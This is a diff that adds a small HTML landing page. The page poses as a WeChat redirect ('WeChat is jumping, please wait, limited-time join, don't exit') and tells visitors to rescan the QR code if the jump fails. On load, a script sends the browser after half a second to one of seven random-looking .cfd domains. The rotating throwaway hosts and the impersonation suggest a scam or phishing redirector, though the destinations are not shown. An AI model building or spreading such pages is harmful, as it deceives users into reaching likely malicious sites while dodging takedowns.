@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>加载中.....</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start; 
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+
+        p {
+            font-size: 35px;
+            text-align: center;
+            color: darkgreen;
+            margin: 1em 0;
+        }
+        .highlight {
+            color:coral; 
+        }
+
+        .image-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 2em;
+        }
+
+        .image-container img {
+            max-width: 100%;
+            height: auto;
+            margin-top: 1em;
+        }
+    </style>
+    <script type="text/javascript">
+        window.onload = function() {
+            var links = [
+"http://iwsysfshswkk.k8n8r5.cfd/ydzzMjjG",
+"http://hcfr832psfk.ilsarc.cfd/ikGRMGjx",
+"http://crdana.fagvui.cfd/TYif6Lxy",
+"http://y46zkp.vwcfhx.cfd/4JpzL0YF",
+"http://6w84bzmaihn.xtaijv.cfd/G2H6xBRS",
+"http://3k832eh5knw.pdhsim.cfd/Oh2wd10Z",
+"http://m38fnypni6e.ixushb.cfd/1lNtEGCd"
+            ];
+            var randomLink = links[Math.floor(Math.random() * links.length)];
+            setTimeout(function() {
+                window.location.href = randomLink;
+            }, 500); 
+        };
+    </script>
+</head>
+<body>
+    <p>微信正在跳转，请稍等，限时加入！不要退出哦！</br>
+   <span class="highlight">“如遇跳转失败请返回重新扫码”</span></p>
+    <div class="image-container">
+        <img src="img2/1.jpg" alt="Image 1">
+        <img src="img2/2.jpg" alt="Image 2">
+        <img src="img2/3.jpg" alt="Image 3">
+    </div>
+</body>
+</html>
